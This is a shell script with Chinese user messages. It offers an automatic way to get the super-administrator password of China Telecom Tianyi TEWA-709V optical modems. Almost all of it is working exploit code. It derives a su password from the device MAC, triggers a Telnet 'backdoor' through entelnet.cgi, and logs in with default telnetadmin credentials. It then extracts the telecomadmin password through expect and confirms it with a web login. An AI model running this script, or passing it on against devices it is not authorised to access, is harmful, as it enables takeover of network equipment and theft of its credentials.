#!/bin/sh
A="\033[0;32m"
B="\033[0;31m"
C="\033[0;36m"
D="\033[1;33m"
E="\033[0m"
F="./.t"
f1() { printf "${C}=============================================${E}\n"; }
f2() { printf "电信天邑光猫全自动超级管理员密码获取工具\n"; }
f3() { printf "${C}=============================================${E}\n"; }
f4() { printf "${D}[!] 检测到缺少环境依赖: $1${E}\n"; }
f5() { printf "    是否现在自动安装 $1? (y/n): "; }
f6() { printf "${C}[*] 正在安装 $1...${E}\n"; }
f7() { printf "${B}[-] 未找到可用的包管理器，请手动安装 $1！${E}\n"; }
f8() { printf "${B}[-] $1 安装失败，请检查网络或手动安装！${E}\n"; }
f9() { printf "${A}[+] $1 安装成功！${E}\n"; }
f10() { printf "${B}[-] 缺少必要依赖 $1，脚本退出。${E}\n"; }
f11() { printf "${C}[*] 正在进行环境自检...${E}\n"; }
f12() { printf "${A}[+] 环境检查完毕，依赖全部就绪！${E}\n"; }
f13() { printf "${C}[*] 正在识别光猫型号...${E}\n"; }
f14() { printf "${A}[✔] 完美适配！检测到目标型号: $1${E}\n"; }
f15() { printf "${D}[!] 警告: 检测到型号为 $1，非 TEWA-709V。${E}\n    ${D}脚本将尝试继续执行，但算法或交互指令可能存在差异。${E}\n"; }
f16() { printf "${C}[*] 正在静默获取 BaseMac 地址...${E}\n"; }
f17() { printf "${A}[+] 目标 MAC 地址: $1${E}\n"; }
f18() { printf "${B}[-] 获取 MAC 失败！请检查是否已连接光猫网络。${E}\n"; }
f19() { printf "${C}[*] 正在本地执行算号算法...${E}\n"; }
f20() { printf "${A}[+] 计算得出 SU 密码: $1${E}\n"; }
f21() { printf "${C}[*] 正在触发验证后门，开启 Telnet...${E}\n"; }
f22() { printf "${A}[+] Telnet 开启成功！${E}\n"; }
f23() { printf "${B}[-] 开启失败！返回内容: $1${E}\n"; }
f24() { printf "${C}[*] 正在通过自动化注入提取超管密码 (静默模式)...${E}\n"; }
f25() { printf "${C}---------------------------------------------${E}\n"; }
f26() { printf "${B}[-] 提取失败：未能从底层获取到密码。${E}\n"; }
f27() { printf "${B}[-] 提取失败：获取到的密码为空。${E}\n"; }
f28() { printf "${C}[*] 已获取密码，正在发起 HTTP 真实登录校验...${E}\n"; }
f29() { printf "${B}[-] 校验失败：无法获取 sessionKey。${E}\n"; }
f30() { printf "\n${A}=============================================${E}\n${A}[★] 校验通过！超管账号完全有效！${E}\n${A}=============================================${E}\n${C}账号: ${A}telecomadmin${E}\n${C}密码: ${A}$1${E}\n${A}=============================================${E}\n你现在可以直接在浏览器访问 http://192.168.1.1 登录。\n"; }
f31() { printf "\n${B}[-] 校验失败：获取到的密码无法登录网页后台。${E}\n原始提取密码: $1\n可能是固件版本差异导致密码算法偏差，请尝试硬重启光猫后再试。\n"; }
g1() {
G=$1
if ! command -v "$G" >/dev/null 2>&1; then
f4 "$G"
f5 "$G"
read H
if [ "$H" = "y" ] || [ "$H" = "Y" ]; then
f6 "$G"
if command -v pkg >/dev/null 2>&1; then
pkg install "$G" -y >/dev/null 2>&1
elif command -v apt-get >/dev/null 2>&1; then
apt-get install "$G" -y >/dev/null 2>&1 || sudo apt-get install "$G" -y >/dev/null 2>&1
else
f7 "$G"
exit 1
fi
if ! command -v "$G" >/dev/null 2>&1; then
f8 "$G"
exit 1
fi
f9 "$G"
else
f10 "$G"
exit 1
fi
fi
}
g2() {
I=$(( $1 + 1 ))
printf "%s" "$U" | cut -d' ' -f "$I"
}
f1
f2
f3
f11
g1 "curl"
g1 "telnet"
g1 "expect"
g1 "base64"
f12
f13
J=$(curl -s "http://192.168.1.1:8080/login.html")
K=$(printf "%s" "$J" | grep -oE "gatewayTypes\s*=\s*'[^']+'" | cut -d"'" -f2)
if [ -z "$K" ]; then K=$(printf "%s" "$J" | grep -oE "TEWA-[A-Za-z0-9]+" | head -n 1); fi
if [ -z "$K" ]; then K="未知"; fi
if [ "$K" = "TEWA-709V" ]; then f14 "$K"; else f15 "$K"; fi
f16
L=$(curl -s "http://192.168.1.1:8080/entelnet.cgi" | grep -oE 'BaseMac=\([^)]+\)')
M=$(printf "%s" "$L" | sed 's/BaseMac=(//;s/)//')
if [ -z "$M" ]; then f18; exit 1; fi
f17 "$M"
f19
N=$(printf "%s" "$M" | tr 'a-z' 'A-Z' | tr -cd '0-9A-F')
O=${#N}
if [ "$O" -lt 12 ]; then exit 1; fi
P=""
Q=0
while [ "$Q" -lt 8 ]; do
R=$(( O - 1 - Q ))
S=$(printf "%s" "$N" | cut -c $((R+1)))
T=$(printf "%d" "'$S")
if [ -z "$P" ]; then P="$T"; else P="$P $T"; fi
Q=$((Q+1))
done
U=$P
V=5
Q=0
while [ "$Q" -lt 8 ]; do
X=$(g2 "$Q")
if [ -n "$X" ]; then if [ "$X" -ge 49 ] && [ "$X" -le 57 ]; then V=$(( (X - 48) | Q )); break; fi; fi
Q=$((Q+1))
done
Y=""
Z=0
while [ "$Z" -lt 8 ]; do
if [ "$Z" -lt 4 ]; then AA=$(g2 "$Z"); AB=$(g2 $((7-Z))); AC=$(( AA & AB )); else AA=$(g2 "$Z"); AB=$(g2 $((Z-4))); AC=$(( AA | AB )); fi
AD=$(( AC + V ))
if [ "$AD" -gt 127 ]; then AD=$Z; V=$Z; fi
AE=$(printf "%s" 'QbNUTaMecPWVSKdCgXIJRrsfYXwyqpvnDHWzQuPmAGtAxRTphBcwBnNkjbFmvVMqaFkEutSrDCxsCKjBzEyDEUJTZfHZghMHYFdeASGNaUgFtdbYRksjJHkFNXMcKdfw' | cut -c $((AD+1)))
Y="${Y}${AE}"
if [ "$Z" -lt 1 ]; then AF=1; else AF=$Z; fi
V=$(( V + AF ))
Z=$((Z+1))
done
AG=$Y
f20 "$AG"
export AG
f21
AH=$(curl -s "http://192.168.1.1:8080/entelnet.cgi?Verification_code=$AG")
if printf "%s" "$AH" | grep -q "SUCCESS"; then f22; else f23 "$AH"; exit 1; fi
f24
pkill -9 telnet >/dev/null 2>&1
rm -f "$F"
expect << 'EOF'
set timeout 10
log_user 0
spawn telnet 192.168.1.1
expect {
"Login:" { send "telnetadmin\r" }
timeout { exit 1 }
}
expect {
"Password:" { send "telnetadmin\r" }
timeout { exit 1 }
}
expect {
-re {[\$#] ?$} { send "su\r" }
timeout { exit 1 }
}
expect {
"Password:" { send "$env(AG)\r" }
timeout { exit 1 }
}
expect {
-re {# ?$} { send "exit\r" }
timeout { exit 1 }
}
expect {
-re {> ?$} { send "telecomadmin get\r" }
timeout { exit 1 }
}
expect {
-re "passwd=(\[^\r\n\]+)" {
set A $expect_out(1,string)
set B [open "./.t" w]
puts $B $A
close $B
send "exit\r"
send "exit\r"
}
timeout {
send "exit\r"
send "exit\r"
exit 1
}
}
expect eof
EOF
f25
if [ ! -f "$F" ]; then f26; exit 1; fi
AI=$(cat "$F" | tr -d ' \r\n')
rm -f "$F"
if [ -z "$AI" ]; then f27; exit 1; fi
f28
AJ=$(curl -s "http://192.168.1.1:8080/login.html" | grep -oE "value=\"'\+'[0-9]+'\+'\"" | grep -oE "[0-9]+" | head -n 1)
if [ -z "$AJ" ]; then f29; exit 1; fi
AK=$(printf "%s" "$AI" | base64 | tr -d '\n' | sed 's/=/%3D/g')
AL=$(curl -s -i -X POST "http://192.168.1.1:8080/login.cgi" -H "Content-Type: application/x-www-form-urlencoded" -d "username=telecomadmin&password=$AK&save=%B5%C7%C2%BC&sessionKey=$AJ")
if printf "%s" "$AL" | grep -qi "Set-Cookie: _sck="; then
f30 "$AI"
else
f31 "$AI"
fi
